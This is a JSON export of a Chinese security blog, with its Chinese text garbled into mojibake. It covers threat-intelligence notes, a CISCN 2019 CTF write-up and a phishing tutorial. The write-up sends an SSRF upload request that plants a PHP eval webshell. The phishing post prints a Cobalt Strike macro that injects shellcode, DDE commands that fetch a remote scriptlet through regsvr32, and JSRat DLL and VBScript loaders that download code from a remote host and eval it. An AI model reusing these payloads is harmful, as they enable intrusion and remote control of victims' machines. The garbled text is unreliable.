Hackingæ“ä½œï¼Œè·å¾—äº†ä»–ä»¬åŸŸåè§£æè®°å½•ç­‰ä¸€äº›åŸºç¡€çš„Itä¿¡æ¯2.æ”»å‡»è€…æ‰¾åˆ°äº†ä¸€ä¸ªç›®æ ‡æ–°æ³¨å†Œçš„åŸŸåï¼Œç„¶åç”¨æœç´¢å¼•æ“æœç´¢ä»–ä»¬çš„ç½‘ç»œç®¡ç†å‘˜çš„ç”µå­é‚®ä»¶ä¿¡æ¯3.æ”»å‡»è€…ä½¿ç”¨é±¼å‰é‚®ä»¶æ–¹å¼å¯¹ç›®æ ‡çš„ç½‘ç»œç®¡ç†å‘˜å‘é€ä¸€å°å¸¦æœ‰æœ¨é©¬çš„é‚®ä»¶4.ç›®æ ‡çš„ç½‘ç®¡ï¼ˆæˆ‘ä»¬å«ä»–ç½‘ç®¡ä¸€å·ï¼‰æ‰“å¼€äº†è¿™å°é‚®ä»¶çš„é™„ä»¶ç„¶åä¸å¹¸ä¸­æª5.ç½‘ç®¡ä¸€å·çš„ä¸»æœºå› ä¸ºä¸­äº†ç—…æ¯’ï¼Œæ‰€ä»¥æ”»å‡»è€…åˆ©ç”¨ç½‘ç®¡ä¸€å·è¿™å°ä¸»æœºå‘é€äº†ä¸€ä¸ªHTTP Postè¯·æ±‚åˆ°åŸŸæ§èŠ‚ç‚¹ï¼Œç„¶ååŸŸæ§èŠ‚ç‚¹è¿”å›äº†ä¸€ä¸ªHTTP Response6.æˆ‘ä»¬é€šè¿‡å¯¹é±¼å‰é‚®ä»¶ä¸­é™„ä»¶è¿›è¡Œé€†å‘åˆ†æå‘ç°é‡Œé¢æœ‰ä¸¤ä¸ªIPåœ°å€ï¼Œç¬¬äºŒä¸ªIPåœ°å€ä½œä¸ºå¤‡ä»½ï¼Œé˜²æ­¢ç¬¬ä¸€ä¸ªå¤±æ•ˆ7.é€šè¿‡C&amp;Cè¯·æ±‚åˆ°ç½‘ç®¡ä¸€å·çš„ä¸»æœºï¼Œæˆ‘ä»¬çš„æ¶æ„ç¨‹åºæ‰“å¼€äº†ä¸€ä¸ªTCPä»£ç†æœåŠ¡8.é€šè¿‡ç½‘ç®¡ä¸€å·ä¸»æœºä¸Šçš„ä»£ç†æœåŠ¡ï¼Œæ”»å‡»è€…ç»§ç»­å»Googleä¸Šæœç´¢å…¶ä»–çš„ç›®æ ‡9.æ”»å‡»è€…æ£€æŸ¥ç½‘ç®¡ä¸€å·é‚®ä»¶çš„é€šä¿¡å½•åˆ—è¡¨å»å¯»æ‰¾æ˜¯å¦æ‹¥æœ‰ç›®æ ‡äºŒå·çš„é€šè®¯æ–¹å¼ï¼Œç»“æœå‘ç°äº†ç›®æ ‡äºŒå·çš„é¦–å¸­ç§‘å­¦å®¶çš„è”ç³»æ–¹å¼10.æ”»å‡»è€…ä½¿ç”¨æ”»é™·çš„ç½‘ç®¡ä¸€å·çš„é‚®ç®±å¯¹ç›®æ ‡äºŒå·çš„é¦–å¸­ç§‘å­¦å®¶çš„é‚®ç®±å‘èµ·é±¼å‰é‚®ä»¶æ”»å‡»ï¼Œå·¥å…·ä½¿ç”¨å’Œä¹‹å‰ä¸€æ ·çš„11.æ­¤æ—¶åˆæ¥äº†ä¸€ä¸ªæ”»å‡»è€…ï¼Œæˆ‘ä»¬ç§°ä»–ä¸ºæ”»å‡»è€…äºŒå·ï¼Œæ”»å‡»è€…ä¸€å·æ‰«æäº†ç›®æ ‡ä¸‰å·çš„webæœåŠ¡å™¨12.ä½¿ç”¨åŒæ ·çš„æ¼æ´åˆ©ç”¨å·¥å…·æ”»å‡»å‘ç°ç›®æ ‡ä¸‰å·ä¸»æœºä¸Šçš„ç›¸åŒçš„æ¼æ´13.è¢«æ”»é™·çš„ç›®æ ‡ä¸‰å·ä¸»æœºè¿”å›ä¸€ä¸ªshellä¼šè¯ç»™æ”»å‡»è€…ä¸‰å·14.ç›®æ ‡ä¸‰å·çš„æ‰€æœ‰æ•°æ®è¢«æ”»å‡»è€…ä¸‰å·çªƒå– è¿™æ ·çš„è¯ä½¿ç”¨Kill-Chainå’Œé’»çŸ³æ¨¡å‹åˆ†æå¯ä»¥åŒæ—¶getåˆ°æ”»å‡»è€…çš„ç‚¹å’Œæƒ³è¦æ”»å‡»çš„ç›®æ ‡ï¼ŒåŒæ—¶è¿˜çŸ¥é“äº†ä»–çš„æ”»å‡»è·¯å¾„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ—¶å€™æˆ‘ä»¬å¯¹æ”»å‡»è€…äº†å¦‚æŒ‡æŒäº†ã€‚ ATT&amp;CK Matrix for Enterpriseè¿™ä¸ªæ˜¯æˆ‘è‡ªå·±åŠ ä¸Šå»çš„ï¼ŒåŒæ—¶ä¹Ÿæ˜¯å¹³æ—¶å»äº†è§£çº¢é˜ŸTTPçš„å¥½åœ°æ–¹ 0x03 æ€»ç»“å­¦ä¹ ä¸Šé¢çš„çŸ¥è¯†ä¹Ÿæœ‰ä¸€ç‚¹è‡ªå·±çš„æƒ³æ³•ï¼Œå¨èƒæƒ…æŠ¥ä½œä¸ºæ€åŠ¿æ„ŸçŸ¥çš„ä¸€ç§ï¼Œä¸ä»…èƒ½å¤Ÿè®©ä¼ä¸šé’ˆå¯¹æ€§çš„è¿›è¡Œé˜²å¾¡ï¼ŒåŒæ—¶ä¹Ÿèƒ½å¤Ÿè®©è¿è¥çœ‹åˆ°è‡ªå·±çš„ä¸€äº›ç›²ç‚¹ï¼Œèƒ½å¤Ÿè·Ÿå¥½çš„è¿›è¡Œä¼ä¸šå®‰å…¨å»ºè®¾ç›¸å…³çš„æ–¹é¢ï¼ˆè¯´åˆ°è¿™é‡Œä¹Ÿä¸å¾—ä¸èµå¹è°·æ­Œçš„0ä¿¡ä»»ï¼ŒçœŸçš„å¤ªç‰›é€¼äº†)ï¼Œå¨èƒæƒ…æŠ¥èƒ½åšçš„äº‹æƒ…è¿˜æ˜¯å¾ˆå¤šçš„ï¼Œæˆ‘è‡ªå·±æ•´ç†ä¹‹åè§‰å¾—æœ‰ä»¥ä¸‹å‡ ä¸ªæ–¹å‘ï¼š 1. ä¼ä¸šå®‰å…¨å»ºè®¾ç›¸å…³ 2. å­¦ä¹ è¿è¥ç›²ç‚¹ 3. æº¯æºæ”»å‡» 4. å…¨çƒå…±äº«æƒ…æŠ¥ï¼Œå¢åŠ å…¥ä¾µæˆæœ¬ 5. å­¦ä¹ æ–°çš„æ”»å‡»æ‰‹æ®µï¼Œæ”¶é›†0dayï¼ˆèœœç½ï¼‰ 6. â€¦â€¦ æœ€åï¼Œe1knotå¸ˆå‚…tql 0x04 é“¾æ¥ä½¿ç”¨å¨èƒæƒ…æŠ¥è°ƒæŸ¥æ”»å‡»è€… ä½¿ç”¨å¨èƒæƒ…æŠ¥è¿½è¸ªæ”»å‡»è€…â€”â€”Part 2 é«˜çº§å¨èƒäº‹ä»¶åˆ†æä¸é˜²å¾¡çŸ©é˜µ æµ…æå¨èƒæƒ…æŠ¥æµ…è°ˆé«˜çº§å¨èƒæƒ…æŠ¥å¯¹äºå®‰å…¨å»ºè®¾çš„æ„ä¹‰ä¸æ€è€ƒï¼ˆä¸Šï¼‰â€”æ”»å‡»è€…æƒ…æŠ¥é‚£äº›ä¸å¾—ä¸è¯´çš„äº‹å„¿æµ…è°ˆé«˜çº§å¨èƒæƒ…æŠ¥å¯¹äºå®‰å…¨å»ºè®¾çš„æ„ä¹‰ä¸æ€è€ƒï¼ˆä¸­ï¼‰â€”åŸºç¡€è®¾æ–½æƒ…æŠ¥é‚£äº›ä¸å¾—ä¸è¯´çš„äº‹å„¿æµ…è°ˆé«˜çº§å¨èƒæƒ…æŠ¥å¯¹äºå®‰å…¨å»ºè®¾çš„æ„ä¹‰ä¸æ€è€ƒï¼ˆä¸‹ï¼‰â€”äº‹ä»¶æƒ…æŠ¥é‚£äº›ä¸å¾—ä¸è¯´çš„äº‹å„¿","categories":[{"name":"Threat Intelligence","slug":"Threat-Intelligence","permalink":"http://patrilic.top/categories/Threat-Intelligence/"}],"tags":[{"name":"å¨èƒæƒ…æŠ¥","slug":"å¨èƒæƒ…æŠ¥","permalink":"http://patrilic.top/tags/å¨èƒæƒ…æŠ¥/"}]},{"title":"CISCN 2019 Final Web11 èµ›åå¤ç›˜","slug":"CISCN 2019 Final Web11","date":"2019-07-28T07:08:02.000Z","updated":"2019-08-20T15:26:59.716Z","comments":true,"path":"2019/07/28/CISCN 2019 Final Web11/","link":"","permalink":"http://patrilic.top/2019/07/28/CISCN 2019 Final Web11/","excerpt":"","text":"@Author: Patrilic@Time: 2019-07-18 11:20:33æ¯”èµ›çš„æ—¶å€™ç†¬äº†ä¸€ä¸‡å¹´ï¼Œåªçœ‹åˆ°äº†ä¸€ä¸ªæœ¬åœ°è¯·æ±‚ï¼Œéƒ½ä¸çŸ¥é“è¿™ä¸ªssrfæ€ä¹ˆåˆ©ç”¨ï¼Œå“ï¼Œè¿˜æ˜¯è¦å¥½å¥½å­¦é€†å‘(åè¡€) é¢˜ç›®ä¿¡æ¯é¢˜ç›®é“¾æ¥ï¼šhttp://web65.buuoj.cn/ (æ¨ä¸€æ‰‹åŒ—è”åˆå¸ˆå‚…çš„å¹³å°)é¢˜ç›®æºç ï¼šhttps://github.com/imagemlt/CISCN_2019_final_pmarkdown.git Write upä¸Šä¼ æ–‡ä»¶æ˜¾ç¤ºåªèƒ½localhostä¸Šä¼ ï¼Œå¹¶ä¸”ä½¿ç”¨$SERVER[â€˜Remote-addrâ€™]æ¥è·å–ipæ„Ÿè§‰åªèƒ½é‡‡ç”¨ssrfä¹‹ç±»çš„æ–¹å¼å»ä¸Šä¼ æ–‡ä»¶ï¼Œä½†æ˜¯ä¸€ç›´æ²¡getåˆ°ç‚¹ http://web65.buuoj.cn/index.php?act=post&amp;md=readme.mdmdå‚æ•°å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå¯ä»¥åˆ©ç”¨phpä¼ªåè®®è¯»æºç  ç„¶è€Œå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œæ¯”èµ›çš„æ—¶å€™å°±ä¸€ç›´å¡åœ¨è¿™é‡Œã€‚ä¸€ç›´åœ¨æƒ³æ€ä¹ˆå»ç»•è¿‡ï¼Œç„¶åæ¯”èµ›ç»™äº†æç¤ºï¼š121. SSRF2. .htaccess .htaccesså¯ä»¥çœ‹åˆ°ä»–è®©.mdæ ¼å¼è§£ææˆäº†php ä½†æ˜¯ssrfåˆæ€ä¹ˆå»çœ‹å‘¢ï¼Œæºç é‡Œè‚¯å®šæ²¡æœ‰ï¼Œé—®é¢˜åº”è¯¥å‡ºåœ¨.soæ–‡ä»¶é‡Œpost.phpé‡Œè°ƒç”¨äº† pmark_include() å‡½æ•° è€Œåœ¨readme.mdé‡Œæ˜¯èƒ½æŠŠsoæ–‡ä»¶ä¸‹ä¸‹æ¥çš„æ‰“å¼€IDAåˆ†æä¸€æ³¢ sub_1850é‡Œå­˜åœ¨ä¸€ä¸ªHttpåŒ…ï¼Œä¼šä»¥127.0.0.1çš„èº«ä»½å»request å¾€ä¸Šæ‰¾è°ƒç”¨1int zend_hash_find ( HashTable* ht, char* arKey, uint nKeyLength, void** pData ) v15: debug å‚æ•°ä¸ºdebug,åˆ©ç”¨ssrfä¸Šä¼ å³å¯ æ‰€ä»¥å¯ä»¥ç›´æ¥æ„é€ payload:12345678910111213141516171819POST /upload.php HTTP/1.1Host: 127.0.0.1:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:66.0) Gecko/20100101 Firefox/66.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh,en-US;q=0.7,en;q=0.3Referer: http://127.0.0.1:8080/index.php?act=uploadContent-Type: multipart/form-data; boundary=---------------------------6693638881479522630623693797Content-Length: 244Connection: closeUpgrade-Insecure-Requests: 1-----------------------------6693638881479522630623693797Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.php&quot;Content-Type: text/php&lt;?phpeval($_REQUEST[a]);-----------------------------6693638881479522630623693797-- åˆ©ç”¨popen()ç»•è¿‡disabled_function","categories":[{"name":"Write-up","slug":"Write-up","permalink":"http://patrilic.top/categories/Write-up/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://patrilic.top/tags/CTF/"}]},{"title":"Phishing Attack - æ–‡ä»¶è½åœ°","slug":"Phishing Attack - æ–‡ä»¶è½åœ°","date":"2019-07-18T03:20:33.000Z","updated":"2019-08-20T15:27:23.041Z","comments":true,"path":"2019/07/18/Phishing Attack - æ–‡ä»¶è½åœ°/","link":"","permalink":"http://patrilic.top/2019/07/18/Phishing Attack - æ–‡ä»¶è½åœ°/","excerpt":"","text":"@Author: Patrilic@Time: 2019-07-18 11:20:33[toc]é±¼å‰æ”»å‡»ï¼Œä½œä¸ºä¸€ç§å¸¸è§çš„æ”»å‡»å½¢å¼ï¼Œä¸­å¿ƒæ€æƒ³å°±æ˜¯å°†shellcodeä»¥å„ç§å½¢å¼è¿›è¡Œä¼ªè£…ï¼Œç„¶åè¯±ä½¿å—å®³è€…å¯åŠ¨ç¨‹åºï¼Œåˆ©ç”¨C2æœåŠ¡å™¨è¿›è¡Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œ é±¼å‰æ”»å‡»çš„éš¾ç‚¹ï¼š ä¿¡ä»»ä¼ªé€  â€“ å¸¸è§çš„æœ‰swaksä¼ªé€ é‚®ä»¶ï¼ŒDNSåŠ«æŒï¼Œæ”¹å†™è¢«ä¿¡ä»»ç½‘ç«™ç­‰ å…æ€ â€“ èƒ½è§„é¿å¸‚é¢ä¸Šå¤§å¤šæ•°æ€æ¯’è½¯ä»¶ï¼Œä¸è¢«å‘ç° ç»´æŒè¿›ç¨‹ â€“ é•¿æœŸæ§åˆ¶ï¼Œï¼Œå¼€æœºè‡ªå¯ ä¸æš´éœ² â€“ ä¸è½åœ°ï¼Œä¾é™„è¿›ç¨‹ï¼Œcertutilç­‰ æœ¬æ–‡æ„åœ¨æ€»ç»“ä¸€äº›è¾ƒä¸ºå¸¸è§çš„åˆ©ç”¨æ–¹å¼ï¼Œä¸æ˜¯å¾ˆæ³¨é‡æ–‡ç¬”ï¼Œçœ‹çœ‹å°±å¥½ï¼Œä¸€äº›è„šæœ¬æ˜¯ç›´æ¥copyå¤§æ‰‹å­@3gstudentå¸ˆå‚…çš„ï¼Œç„¶åå…³äºç±»ä¼¼ä¸CobaltStrikeçš„Spear phishä»¥åŠNginxçš„ç©æ³•ï¼Œå•ç‹¬è¿›è¡Œæ€»ç»“ 0x00 OfficeOffice MacroOfficeæ–‡æ¡£å†…ç½®å®ï¼Œå¯åˆ©ç”¨VBè¿œç¨‹å‘½ä»¤æ‰§è¡Œå›å¼¹åˆ°C2æœåŠ¡å™¨ğŸ‘‡ç”±CobaltStrikeç”Ÿæˆçš„Macroç—…æ¯’æ ·æœ¬ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293Private Type PROCESS_INFORMATION hProcess As Long hThread As Long dwProcessId As Long dwThreadId As LongEnd TypePrivate Type STARTUPINFO cb As Long lpReserved As String lpDesktop As String lpTitle As String dwX As Long dwY As Long dwXSize As Long dwYSize As Long dwXCountChars As Long dwYCountChars As Long dwFillAttribute As Long dwFlags As Long wShowWindow As Integer cbReserved2 As Integer lpReserved2 As Long hStdInput As Long hStdOutput As Long hStdError As LongEnd Type#If VBA7 Then Private Declare PtrSafe Function CreateStuff Lib \"kernel32\" Alias \"CreateRemoteThread\" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr Private Declare PtrSafe Function AllocStuff Lib \"kernel32\" Alias \"VirtualAllocEx\" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr Private Declare PtrSafe Function WriteStuff Lib \"kernel32\" Alias \"WriteProcessMemory\" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr Private Declare PtrSafe Function RunStuff Lib \"kernel32\" Alias \"CreateProcessA\" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long#Else Private Declare Function CreateStuff Lib \"kernel32\" Alias \"CreateRemoteThread\" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long Private Declare Function AllocStuff Lib \"kernel32\" Alias \"VirtualAllocEx\" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long Private Declare Function WriteStuff Lib \"kernel32\" Alias \"WriteProcessMemory\" (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long Private Declare Function RunStuff Lib \"kernel32\" Alias \"CreateProcessA\" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long#End IfSub Auto_Open() Dim myByte As Long, myArray As Variant, offset As Long Dim pInfo As PROCESS_INFORMATION Dim sInfo As STARTUPINFO Dim sNull As String Dim sProc As String#If VBA7 Then Dim rwxpage As LongPtr, res As LongPtr#Else Dim rwxpage As Long, res As Long#End If myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,-46,4,0,0,83,80,104,87,-119,-97, _-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _-1,-1,47,74,112,110,52,0,71,-37,19,-87,58,-110,11,66,63,40,-36,-114,-75,-101,62,108,29,-115,-75,-106,35,-3,71,126,24,-107,101,80,116,13,70,52, _101,6,59,-12,-45,32,103,-104,10,62,77,18,-84,12,58,23,80,56,-75,32,-39,8,-80,107,-43,108,71,63,20,41,-82,-42,23,58,-126,98,-100,-108,-126,76, _-44,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _83,73,69,32,57,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,84,114,105,100,101,110,116,47,53,46,48,59,32,66,79, _73,69,57,59,69,78,85,83,77,83,69,41,13,10,0,53,-24,107,-26,-93,106,-40,-71,-105,-127,-22,100,-16,117,-9,83,112,-101,60,-4,105,72,-127,96,-60, _-29,27,-62,-29,98,-95,-56,-46,-6,-57,-39,7,23,-70,101,-16,86,-85,-15,25,102,48,-46,-118,-62,1,-19,85,56,18,-105,41,124,102,116,-54,50,-67,81,-20, _40,-19,-52,101,6,116,118,-128,-118,-9,-46,-96,-122,116,-70,107,-54,-78,59,119,-51,-52,5,96,53,-9,-60,102,-96,109,-90,-122,-92,-81,34,-70,-106,10,7,121, _-6,-5,-12,107,-44,73,-31,52,87,-89,13,77,-121,-68,-37,74,-23,54,59,-122,79,66,65,-39,58,121,-100,20,53,28,27,-15,29,52,-107,127,-89,40,-4,-122, _-73,-101,75,-64,-59,111,105,16,79,-121,7,33,-121,58,125,79,59,31,-97,-45,25,105,90,-99,6,38,74,-22,86,17,-99,-58,-36,55,5,-96,-109,48,42,-66, _-23,-116,-38,-13,-33,89,30,32,90,53,11,119,118,-33,-48,77,24,-76,-11,44,50,-68,-127,-70,-43,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,52,53,46,51,50,46,55,56,46,49,49,55,0,111,-86,81,-61) If Len(Environ(\"ProgramW6432\")) &gt; 0 Then sProc = Environ(\"windir\") &amp; \"\\\\SysWOW64\\\\rundll32.exe\" Else sProc = Environ(\"windir\") &amp; \"\\\\System32\\\\rundll32.exe\" End If res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo) rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40) For offset = LBound(myArray) To UBound(myArray) myByte = myArray(offset) res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;) Next offset res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)End SubSub AutoOpen() Auto_OpenEnd SubSub Workbook_Open() Auto_OpenEnd Sub ä»£ç åˆ†æï¼š sProcä¸ºrundll32.exeçš„è·¯å¾„ç„¶åRunStff -&gt; CreateProcessAä½¿ç”¨rundll32åˆ›å»ºè¿›ç¨‹ï¼Œç„¶åä½¿ç”¨WriteStuffæ³¨å…¥shellcode(myArray) PS: åŒæ—¶ä¹Ÿå¯ç”¨Msf æˆ–è€… Empireç­‰å·¥å…·ç”ŸæˆMacroåé—¨ Office DDECtrl + F9 ï¼ˆCommand + F9ï¼‰å¯å¼€å¯åŸŸå¡«å…¥ä»£ç å³å¯1DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe &quot;/k calc.exe&quot; \\* MERGEFORMAT è”åŠ¨MSF (web_delivery)ï¼š1DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe &quot;/k regsvr32 /s /n /u /i:http://192.168.0.1/A9IcXi.sct scrobj.dll&quot; è¿™ç§æ–¹å¼å›éœ€è¦å—å®³è€…ç¡®è®¤æ‰“å¼€è¿›ç¨‹ï¼Œæœ‰ä¸€å®šé£é™© Excel IQYIQYæ˜¯ä¸€ä¸ªExcel WebæŸ¥è¯¢ç”¨åˆ°çš„ä¸œè¥¿ï¼Œå¯ä»¥ç›´æ¥å§äº’è”ç½‘ä¸Šçš„ä¸œè¥¿æ‰“å°åˆ°è¡¨ä¸­æ•°æ®-&gt;å€’å…¥æ•°æ®-&gt;æ–°å»ºWebæŸ¥è¯¢ 1=cmd|&apos;/c calc.exe &apos;!A0 å•å¼•å·å†…è°ƒç”¨æ¶æ„ç¨‹åº åŒæ ·éœ€è¦å—å®³è€…ç¡®è®¤æ‰“å¼€è¿›ç¨‹ OLEOLE - å¤–éƒ¨å¯¹è±¡å¸¸è§åˆ©ç”¨åœºæ™¯è§CVE-2017-0199 UNCè·¯å¾„UNC(Universal Naming Convention)å°±æ˜¯windowså…±äº«è¿›è¡Œç»å…¸ç”¨æ³•:https://github.com/0x09AL/WordSteal æ’å…¥UNCè·¯å¾„çš„å›¾ç‰‡çªƒå–ç›®æ ‡ç”¨æˆ·NTMLhash Powerpoint Button CVE-2017-0199åˆ©ç”¨rtfçš„ç‰¹æ€§ï¼Œå¯ä»¥è‡ªå¯åŠ¨åŠ è½½OLEè°ƒç”¨çš„å¤–éƒ¨ç»„ä»¶ï¼Œé€šè¿‡ä¿®æ”¹Serverçš„MIMEç±»å‹ï¼Œè®©å¼•ç”¨çš„RTFæ–‡æ¡£è§£æä¸ºHTAæ–‡ä»¶ï¼Œæ‰§è¡Œå‘½ä»¤å½±å“ç‰ˆæœ¬ï¼šOffice 2007,Office 2010,Office 2013,Office 2016 æ³¨æ„ç‚¹ï¼šä½¿ç”¨Notepad++å°†ç”Ÿæˆçš„rtfæ–‡æ¡£é‡Œçš„\\object\\objautlink\\rsltpictæ›¿æ¢ä¸º\\object\\objautlink\\objupdate\\rsltpict è‡³äºä¿®æ”¹File Serverçš„MIMEç±»å‹:ç›´æ¥åœ¨Apache2çš„ä¸»é…ç½®ä¸­ç¼–è¾‘ï¼šAddType application/rtf .rtf CVE-2017-8570åŸç†ï¼šåˆ©ç”¨RTFæ–‡æ¡£çš„Packager.dllæ­é…%temp%ç›®å½•ï¼Œå°†.sctä»¥Packagerå¯¹è±¡å­˜å…¥ï¼Œå†ç”¨rtfæ–‡æ¡£å»è°ƒç”¨ä»–ï¼Œå°±å¯ä»¥è¾¾åˆ°åˆ©ç”¨.sctè°ƒç”¨COMæ¥å£æ¥æ‰§è¡Œå‘½ä»¤çš„æ•ˆæœ https://github.com/klionsec/PhishingExploit/blob/master/CVE-2017-8570/packager_composite_moniker.py 0x01 Notepad++ dllåé—¨å°±æ˜¯åˆ©ç”¨notepad++è‡ªå¸¦çš„import pluginåŠŸèƒ½ï¼Œè°ƒç”¨dllè¾¾åˆ°å‘½ä»¤æ‰§è¡Œ åº”ç”¨åœºæ™¯ï¼š ä¼ªé€ æ’ä»¶è¿›è¡Œé’“é±¼ 0x02 JSRATJavascript Backdoor æ ¸å¿ƒæ€è·¯æ˜¯åˆ©ç”¨rundll32.exeæ‰§è¡Œjavascriptä»£ç 1rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert(â€˜fooâ€™); æ‰€ä»¥ï¼Œä¸ºä»€ä¹ˆå¯ä»¥æ‰§è¡Œå‘¢ï¼ŸJavaScriptåé—¨æ·±å±‚åˆ†æ JavaScript Phishing åˆ©ç”¨DLL åŠ è½½ JS12345678910111213141516171819BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: &#123; char *command=\"cmd.exe /c start rundll32.exe javascript:\\\"\\\\..\\\\mshtml,RunHTMLApplication \\\";document.write();h=new\\%20ActiveXObject(\\\"WinHttp.WinHttpRequest.5.1\\\");h.Open(\\\"GET\\\",\\\"http://192.168.1.100/connect\\\",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new\\%20ActiveXObject(\\\"WScript.Shell\\\").Run(\\\"cmd /c taskkill /f /im rundll32.exe\\\",0,true);&#125;\"; WinExec(command,SW_HIDE); &#125; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; å›å¼¹åˆ°192.168.1.100çš„JSRat.ps1 åˆ©ç”¨ swf åŠ è½½ JSåŒæ ·çš„ï¼Œåˆ©ç”¨msfè‡ªå¸¦ windows/execæ¨¡å—ç”Ÿæˆshellcode åˆ©ç”¨Adobe Flash CS6ç¼–è¯‘ç”Ÿæˆswfï¼Œé…åˆAdobe Flash Playeræ¼æ´å³å¯RCE åˆ©ç”¨ æµè§ˆå™¨æ¼æ´ åŠ è½½ JSCVE-2014-6332 ç­‰æ¼æ´åˆ©ç”¨é¡µé¢æ‰§è¡ŒVB Script12345678&lt;SCRIPT LANGUAGE=\"VBScript\"&gt;function runmumaa() On Error Resume Nextset shell=createobject(\"wscript.shell\")shell.run \"rundll32.exe javascript:\"\"\\..\\mshtml,RunHTMLApplication \"\";document.write();h=new%20ActiveXObject(\"\"WinHttp.WinHttpRequest.5.1\"\");h.Open(\"\"GET\"\",\"\"http://192.168.174.136/connect\"\",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject(\"\"WScript.Shell\"\").Run(\"\"cmd /c taskkill /f /im rundll32.exe\"\",0,true);&#125;\",0end function &lt;/script&gt; åˆ©ç”¨ VBS åŠ è½½ JSåˆ©ç”¨VBSè°ƒç”¨Wscript.shellï¼Œè¿è¡Œå‘½ä»¤12set shell=createobject(\"wscript.shell\")shell.run \"rundll32.exe javascript:\"\"\\..\\mshtml,RunHTMLApplication \"\";document.write();h=new%20ActiveXObject(\"\"WinHttp.WinHttpRequest.5.1\"\");h.Open(\"\"GET\"\",\"\"http://192.168.174.136/connect\"\",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject(\"\"WScript.Shell\"\").Run(\"\"cmd /c taskkill /f /im 